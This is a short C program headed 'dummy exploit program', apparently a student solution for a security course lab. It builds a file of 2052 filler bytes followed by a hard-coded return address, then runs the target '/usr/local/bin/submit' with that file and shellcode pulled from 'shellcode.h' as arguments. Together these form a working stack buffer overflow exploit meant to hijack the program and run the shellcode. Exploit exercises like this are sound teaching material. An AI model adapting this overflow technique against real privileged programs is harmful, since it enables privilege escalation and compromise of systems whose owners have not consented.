/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include "shellcode.h"


#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];
  int bufferSize = 2048;
  int i = 0;

  FILE *f;

  f = fopen("filename.txt", "w");

  while(i <= bufferSize + 4 - 1) {
    fprintf(f, "%c", 'm');
    i = i + 1;
  }
  fprintf(f, "%c", 0xb8);
  fprintf(f, "%c", 0xdf);
  fprintf(f, "%c", 0xbf);
  fprintf(f, "%c", 0xff);


  fclose(f);


  args[0] = "blah"; 
  args[1] = "filename.txt"; 
  args[2] = shellcode; 
  args[3] = NULL;

  env[0] = NULL; 

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
